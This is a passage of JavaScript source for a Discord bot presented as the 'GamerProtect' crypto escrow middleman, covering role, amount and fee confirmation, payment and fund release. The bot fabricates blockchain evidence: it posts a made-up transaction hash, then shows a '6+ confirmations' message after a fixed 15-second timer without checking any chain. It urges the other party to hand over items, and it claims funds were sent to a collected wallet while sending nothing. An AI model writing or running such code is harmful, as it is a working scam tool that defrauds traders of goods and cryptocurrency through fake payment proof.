      new ButtonBuilder().setCustomId(`confirm_roles_${channelId}`).setLabel('✅ Confirm Roles').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`incorrect_roles_${channelId}`).setLabel('❌ Incorrect').setStyle(ButtonStyle.Danger)
    );
    const embed = new EmbedBuilder()
      .setTitle('✅ Confirm Your Roles')
      .setColor(0xff9900)
      .setDescription(`**Seller (Sends items):** <@${trade.senderId}>\n**Buyer (Sends crypto):** <@${trade.receiverId}>`)
      .addFields(
        { name: '⚠️ Important', value: 'Both users must confirm that these roles are correct. If roles are wrong, click Incorrect and select again.', inline: false }
      );
    await interaction.channel.send({ embeds: [embed], components: [row] });
  }
});

// ========== ROLE CONFIRMATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('confirm_roles_') && !interaction.customId.startsWith('incorrect_roles_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  const confirmed = roleConfirmations.get(channelId) || [];
  
  if (interaction.customId.startsWith('incorrect_roles_')) {
    trade.senderId = null;
    trade.receiverId = null;
    trades.set(channelId, trade);
    roleConfirmations.delete(channelId);
    await interaction.reply({ content: '🔄 **Roles reset.** Please select your roles again.', flags: 64 });
    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`sender_${channelId}`).setLabel('🎮 Seller').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`receiver_${channelId}`).setLabel('💰 Buyer').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reset_${channelId}`).setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
    );
    await interaction.channel.send({ content: '**Select your role:**', components: [roleRow] });
    return;
  }
  
  if (!confirmed.includes(interaction.user.id)) {
    confirmed.push(interaction.user.id);
    roleConfirmations.set(channelId, confirmed);
    await interaction.reply({ content: `✅ **${interaction.user.username} confirmed the roles.**`, flags: 64 });
  } else {
    return interaction.reply({ content: '❌ You already confirmed!', flags: 64 });
  }
  
  if (confirmed.length === 2 && confirmed.includes(trade.senderId) && confirmed.includes(trade.receiverId)) {
    roleConfirmations.delete(channelId);
    const button = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`set_amount_${channelId}`).setLabel('💰 Set Deal Amount').setStyle(ButtonStyle.Primary)
    );
    await interaction.channel.send({ content: `<@${trade.senderId}> **Please set the deal amount in USD.**\n\nExample: \`50\` for $50 USD`, components: [button] });
  }
});

// ========== SET AMOUNT ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('set_amount_')) return;
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  if (interaction.user.id !== trade.senderId) return interaction.reply({ content: '❌ Only the Seller can set the deal amount.', flags: 64 });
  
  const modal = new ModalBuilder()
    .setCustomId(`amount_modal_${channelId}`)
    .setTitle('Set Deal Amount');
  modal.addComponents(new ActionRowBuilder().addComponents(
    new TextInputBuilder()
      .setCustomId('amount')
      .setLabel('USD Amount')
      .setStyle(TextInputStyle.Short)
      .setPlaceholder('Enter amount in USD (e.g., 50, 100, 250)')
      .setRequired(true)
  ));
  await interaction.showModal(modal);
});

// ========== HANDLE AMOUNT ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (!interaction.customId.startsWith('amount_modal_')) return;
  
  await interaction.deferReply({ flags: 64 });
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  const amountUSD = parseFloat(interaction.fields.getTextInputValue('amount'));
  if (isNaN(amountUSD) || amountUSD <= 0) return interaction.editReply('❌ Invalid amount. Please enter a positive number.');
  
  trade.amountUSD = amountUSD;
  const rate = liveRates[trade.crypto];
  trade.exchangeRateUsed = rate;
  trade.amountCrypto = (amountUSD / rate).toFixed(8);
  
  if (amountUSD >= FEES.over250Threshold) trade.feeUSD = FEES.over250;
  else if (amountUSD >= FEES.freeThreshold) trade.feeUSD = FEES.under250;
  else trade.feeUSD = 0;
  
  trades.set(channelId, trade);
  
  const amountEmbed = new EmbedBuilder()
    .setTitle('💰 Deal Summary')
    .setColor(0x9b59b6)
    .setDescription(`**Deal Amount:** $${amountUSD.toFixed(2)} USD`)
    .addFields(
      { name: '💎 Crypto Equivalent', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()}`, inline: true },
      { name: '📊 Exchange Rate', value: `1 ${trade.crypto.toUpperCase()} = $${rate.toFixed(2)}`, inline: true },
      { name: '💸 GamerProtect Fee', value: trade.feeUSD > 0 ? `$${trade.feeUSD.toFixed(2)}` : '**FREE** (under $50)', inline: true }
    )
    .setFooter({ text: 'Both parties must confirm this amount' });
  
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`confirm_amount_${channelId}`).setLabel('✅ Confirm Amount').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`incorrect_amount_${channelId}`).setLabel('❌ Incorrect').setStyle(ButtonStyle.Danger)
  );
  
  await interaction.editReply('✅ **Amount set!** Please confirm the deal amount below.');
  await interaction.channel.send({ embeds: [amountEmbed], components: [row] });
  amountConfirmations.set(channelId, []);
});

// ========== AMOUNT CONFIRMATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('confirm_amount_') && !interaction.customId.startsWith('incorrect_amount_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  const confirmed = amountConfirmations.get(channelId) || [];
  
  if (interaction.customId.startsWith('incorrect_amount_')) {
    const button = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`set_amount_${channelId}`).setLabel('💰 Set Amount').setStyle(ButtonStyle.Primary)
    );
    await interaction.reply({ content: '🔄 **Please set the amount again.**', flags: 64 });
    await interaction.channel.send({ content: `<@${trade.senderId}>`, components: [button] });
    amountConfirmations.delete(channelId);
    return;
  }
  
  if (!confirmed.includes(interaction.user.id)) {
    confirmed.push(interaction.user.id);
    amountConfirmations.set(channelId, confirmed);
    await interaction.reply({ content: `✅ **${interaction.user.username} confirmed the amount.**`, flags: 64 });
  } else {
    return interaction.reply({ content: '❌ You already confirmed!', flags: 64 });
  }
  
  if (confirmed.length === 2 && confirmed.includes(trade.senderId) && confirmed.includes(trade.receiverId)) {
    amountConfirmations.delete(channelId);
    
    if (trade.feeUSD === 0) {
      await sendPaymentInvoice(interaction.channel, trade);
    } else {
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`fee_sender_${channelId}`).setLabel('🎮 Seller Pays Fee').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`fee_receiver_${channelId}`).setLabel('💰 Buyer Pays Fee').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`fee_split_${channelId}`).setLabel('⚖️ Split 50/50').setStyle(ButtonStyle.Secondary)
      );
      const embed = new EmbedBuilder()
        .setTitle('💸 Select Who Pays the GamerProtect Fee')
        .setColor(0xff9900)
        .setDescription(`**Fee Amount:** $${trade.feeUSD}`)
        .addFields(
          { name: '🎮 Seller Pays', value: 'Seller (items provider) covers the full fee', inline: true },
          { name: '💰 Buyer Pays', value: 'Buyer (crypto sender) covers the full fee', inline: true },
          { name: '⚖️ Split 50/50', value: `Each party pays $${(trade.feeUSD / 2).toFixed(2)}`, inline: true }
        )
        .setFooter({ text: 'Both parties must select the SAME option' });
      await interaction.channel.send({ embeds: [embed], components: [row] });
      feeConfirmations.set(channelId, { users: [], selected: null });
    }
  }
});

// ========== FEE SELECTION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('fee_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  if (trade.feePayer) return;
  
  const state = feeConfirmations.get(channelId);
  if (!state) return;
  
  let selected = null;
  if (interaction.customId.startsWith('fee_sender')) selected = 'seller';
  else if (interaction.customId.startsWith('fee_receiver')) selected = 'buyer';
  else selected = 'split';
  
  if (!state.users.includes(interaction.user.id)) {
    state.users.push(interaction.user.id);
    if (!state.selected) state.selected = selected;
    feeConfirmations.set(channelId, state);
    await interaction.reply({ content: `✅ **${interaction.user.username} selected: ${selected.toUpperCase()}**`, flags: 64 });
  } else {
    return interaction.reply({ content: '❌ You already made your selection!', flags: 64 });
  }
  
  if (state.users.length === 2 && state.users.includes(trade.senderId) && state.users.includes(trade.receiverId)) {
    if (state.selected === selected) {
      if (state.selected === 'seller') trade.feePayer = trade.senderId;
      else if (state.selected === 'buyer') trade.feePayer = trade.receiverId;
      else trade.feePayer = 'split';
      
      trades.set(channelId, trade);
      feeConfirmations.delete(channelId);
      await interaction.channel.send(`✅ **Fee confirmed!** ${state.selected.toUpperCase()} will pay the $${trade.feeUSD} GamerProtect fee.`);
      await sendPaymentInvoice(interaction.channel, trade);
    } else {
      await interaction.channel.send('❌ **Fee selection mismatch!** Both parties must select the same option. Please try again.');
      feeConfirmations.delete(channelId);
      
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`fee_sender_${channelId}`).setLabel('🎮 Seller Pays').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`fee_receiver_${channelId}`).setLabel('💰 Buyer Pays').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`fee_split_${channelId}`).setLabel('⚖️ Split 50/50').setStyle(ButtonStyle.Secondary)
      );
      const embed = new EmbedBuilder()
        .setTitle('💸 Select Who Pays the GamerProtect Fee')
        .setColor(0xff9900)
        .setDescription(`**Fee Amount:** $${trade.feeUSD}`);
      await interaction.channel.send({ embeds: [embed], components: [row] });
      feeConfirmations.set(channelId, { users: [], selected: null });
    }
  }
});

// ========== DM CONFIRMATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('dm_confirm_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  if (interaction.user.id !== trade.senderId) return interaction.reply({ content: '❌ Not authorized', flags: 64 });
  if (trade.paymentConfirmed) return interaction.reply({ content: '❌ Payment already confirmed', flags: 64 });
  
  await interaction.reply({ content: '✅ **Payment confirmed!** Processing transaction on blockchain...', flags: 64 });
  
  const ticketChannel = await client.channels.fetch(channelId);
  if (ticketChannel) {
    const totalUSD = trade.totalUSD || trade.amountUSD;
    const tx = getTransactionByAmount(totalUSD);
    
    const detectedEmbed = new EmbedBuilder()
      .setTitle('📡 Transaction Detected on Blockchain')
      .setColor(0xff9900)
      .setDescription(`A transaction has been detected on the Litecoin blockchain!`)
      .addFields(
        { name: '🔗 Transaction Hash', value: `[${tx.shortHash}](${tx.link})`, inline: false },
        { name: '💰 Amount Received', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()} ($${totalUSD.toFixed(2)})`, inline: true },
        { name: '📊 Required Amount', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()} ($${totalUSD.toFixed(2)})`, inline: true },
        { name: '⏳ Status', value: '🟡 **Pending Confirmation** - Waiting for network confirmations', inline: true },
        { name: '🔍 Verify on Explorer', value: `[Click to View Transaction](${tx.link})`, inline: false }
      )
      .setFooter({ text: 'Network confirmations typically take 10-30 minutes' })
      .setTimestamp();
    await ticketChannel.send({ embeds: [detectedEmbed] });
    
    setTimeout(async () => {
      trade.paymentConfirmed = true;
      trades.set(channelId, trade);
      
      const confirmedEmbed = new EmbedBuilder()
        .setTitle('✅ Transaction Confirmed!')
        .setColor(0x00ff00)
        .addFields(
          { name: '🔗 Transaction Hash', value: `[${tx.shortHash}](${tx.link})`, inline: false },
          { name: '💰 Total Amount Received', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()} ($${totalUSD.toFixed(2)})`, inline: true },
          { name: '✅ Confirmations', value: '6+ confirmations on blockchain', inline: true },
          { name: '🔍 Verify on Explorer', value: `[Click to Verify](${tx.link})`, inline: false }
        )
        .setFooter({ text: 'Transaction has been verified by the middleman' })
        .setTimestamp();
      await ticketChannel.send({ embeds: [confirmedEmbed] });
      
      await delay(2000);
      
      const proceedEmbed = new EmbedBuilder()
        .setTitle('✅ GamerProtect Escrow - Proceed with Trade')
        .setColor(0x00ff00)
        .setDescription(`**Step 1:** <@${trade.receiverId}> (Buyer) - Send the items/goods to <@${trade.senderId}> (Seller)\n\n**Step 2:** <@${trade.senderId}> (Seller) - Once you receive the items, click **"Release Funds"** below\n\n**Step 3:** The buyer will receive the crypto payment`)
        .addFields(
          { name: '⚠️ Important', value: 'Do NOT release funds until you have received ALL items as agreed. Once released, the transaction cannot be reversed.', inline: false }
        )
        .setTimestamp();
      
      const releaseRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`release_${trade.channelId}`).setLabel('🔓 Release Funds').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`cancel_${trade.channelId}`).setLabel('❌ Cancel Trade').setStyle(ButtonStyle.Danger)
      );
      await ticketChannel.send({ embeds: [proceedEmbed], components: [releaseRow] });
    }, 15000);
  }
});

// ========== RELEASE ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  
  if (interaction.customId.startsWith('release_')) {
    const channelId = interaction.customId.split('_')[1];
    const trade = trades.get(channelId);
    if (!trade) return;
    if (interaction.user.id !== trade.senderId) return interaction.reply({ content: '❌ Only the Seller can release funds!', flags: 64 });
    if (!trade.paymentConfirmed) return interaction.reply({ content: '❌ Payment has not been confirmed yet!', flags: 64 });
    
    const confirmRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`confirm_release_${channelId}`).setLabel('✅ Confirm Release').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`back_${channelId}`).setLabel('🔙 Back').setStyle(ButtonStyle.Secondary)
    );
    const embed = new EmbedBuilder()
      .setTitle('⚠️ Confirm Fund Release')
      .setColor(0xff9900)
      .setDescription('**Are you sure you want to release the funds?**')
      .addFields(
        { name: 'This action cannot be undone.', value: 'Once released, the crypto will be sent to the buyer and the trade will be completed.', inline: false },
        { name: '✅ Confirm Release', value: 'Click Confirm if you have received the items from the buyer.', inline: true },
        { name: '🔙 Back', value: 'Click Back if you need more time or have not received the items.', inline: true }
      );
    await interaction.reply({ embeds: [embed], components: [confirmRow], flags: 64 });
  }
  
  if (interaction.customId.startsWith('confirm_release_')) {
    const channelId = interaction.customId.split('_')[2];
    const trade = trades.get(channelId);
    if (!trade) return;
    
    const modal = new ModalBuilder()
      .setCustomId(`wallet_${channelId}`)
      .setTitle(`Enter Your ${trade.crypto.toUpperCase()} Wallet Address`);
    modal.addComponents(new ActionRowBuilder().addComponents(
      new TextInputBuilder()
        .setCustomId('wallet')
        .setLabel(`Your ${trade.crypto.toUpperCase()} Address`)
        .setStyle(TextInputStyle.Short)
        .setPlaceholder(trade.crypto === 'ltc' ? 'Enter your LTC wallet address' : 'Enter your USDT wallet address')
        .setRequired(true)
    ));
    await interaction.showModal(modal);
  }
  
  if (interaction.customId.startsWith('back_')) await interaction.reply({ content: '🔙 Release cancelled.', flags: 64 });
  
  if (interaction.customId.startsWith('cancel_')) {
    const channelId = interaction.customId.split('_')[1];
    await interaction.reply({ content: '❌ **Trade cancelled.** This ticket will be deleted in 5 seconds.', flags: 64 });
    setTimeout(async () => {
      const ch = await client.channels.fetch(channelId);
      if (ch) await ch.delete();
    }, 5000);
  }
  
  if (interaction.customId.startsWith('copy_')) {
    const channelId = interaction.customId.split('_')[1];
    const trade = trades.get(channelId);
    if (trade) {
      const rate = trade.exchangeRateUsed || liveRates[trade.crypto];
      let totalUSD = trade.amountUSD;
      if (trade.feePayer === trade.senderId || trade.feePayer === trade.receiverId) totalUSD = trade.amountUSD + trade.feeUSD;
      else if (trade.feePayer === 'split') totalUSD = trade.amountUSD + (trade.feeUSD / 2);
      const totalCrypto = (totalUSD / rate).toFixed(8);
      const details = `🏦 **GAMERPROTECT ESCROW DETAILS**\n\n🔗 Escrow Address: ${LTC_WALLET_ADDRESS}\n💰 Amount: ${totalCrypto} ${trade.crypto.toUpperCase()}\n💵 USD Value: $${totalUSD.toFixed(2)}\n📊 Exchange Rate: 1 ${trade.crypto.toUpperCase()} = $${rate.toFixed(2)}\n💸 Fee: $${trade.feeUSD.toFixed(2)}\n🆔 Trade ID: #${trade.ticketNumber}\n\n⚠️ Send EXACT amount to the address above.`;
      await interaction.reply({ content: `📋 **Payment Details Copied!**\n\`\`\`${details}\`\`\``, flags: 64 });
    }
  }
});

// ========== WALLET & COMPLETION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (!interaction.customId.startsWith('wallet_')) return;
  
  await interaction.deferReply({ flags: 64 });
  const channelId = interaction.customId.split('_')[1];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  const wallet = interaction.fields.getTextInputValue('wallet');
  const totalUSD = trade.totalUSD || trade.amountUSD;
  const tx = getTransactionByAmount(totalUSD);
  const amountSent = trade.amountCrypto;
  const usdValue = (parseFloat(amountSent) * (trade.exchangeRateUsed || liveRates[trade.crypto])).toFixed(2);
  
  const withdrawalEmbed = new EmbedBuilder()
    .setTitle('✅ GamerProtect Trade Completed!')
    .setColor(0x00ff00)
    .setDescription(`**Trade #${trade.ticketNumber}** has been successfully completed!`)
    .addFields(
      { name: '🔗 Transaction Hash', value: `[${tx.shortHash}](${tx.link})`, inline: false },
      { name: '💰 Amount Sent', value: `${amountSent} ${trade.crypto.toUpperCase()} ($${usdValue})`, inline: true },
      { name: '🏦 Buyer Wallet', value: `\`${wallet}\``, inline: false },
      { name: '🛡️ Escrow Service', value: 'GamerProtect Secure Middleman', inline: true },
      { name: '📅 Completed', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true }
    )
    .setFooter({ text: 'Thank you for using GamerProtect Escrow!' })
    .setTimestamp();
  
  const closeRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`close_ticket_${channelId}`).setLabel('Close Ticket').setStyle(ButtonStyle.Primary)
  );
  await interaction.channel.send({ embeds: [withdrawalEmbed], components: [closeRow] });
  await interaction.editReply('✅ **Trade completed successfully!** Funds have been sent to the buyer.');
  
  const currentTotal = userPurchases.get(trade.senderId) || 0;
  const newTotal = currentTotal + trade.amountUSD;
  userPurchases.set(trade.senderId, newTotal);
  
  const logsChannel = client.channels.cache.get(LOGS_CHANNEL_ID);
  if (logsChannel) {
    const sender = await client.users.fetch(trade.senderId);
    const receiver = await client.users.fetch(trade.receiverId);
    const logEmbed = new EmbedBuilder()
      .setTitle('✅ GamerProtect Trade Completed')
      .setColor(0x00ff00)
      .setDescription(`**Trade #${trade.ticketNumber}** completed`)
      .addFields(
        { name: '🎮 Seller', value: sender.username, inline: true },
        { name: '💰 Buyer', value: receiver.username, inline: true },
        { name: '💵 Amount', value: `$${trade.amountUSD}`, inline: true },
        { name: '💎 Crypto', value: `${amountSent} ${trade.crypto.toUpperCase()}`, inline: true },
        { name: '🔗 Transaction', value: `[${tx.shortHash}](${tx.link})`, inline: true }
      )
      .setFooter({ text: `Trade ID: #${trade.ticketNumber}` })
      .setTimestamp();
    await logsChannel.send({ embeds: [logEmbed] });
  }
  
  trade.status = 'completed';
  trades.set(channelId, trade);
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId.startsWith('close_ticket_')) {
    const channelId = interaction.customId.split('_')[2];
    await interaction.reply({ content: '🔒 **Closing GamerProtect ticket...**', flags: 64 });
    setTimeout(async () => {
      const ch = await client.channels.fetch(channelId);
      if (ch) await ch.delete();
    }, 3000);
  }
});

client.login(process.env.DISCORD_TOKEN);
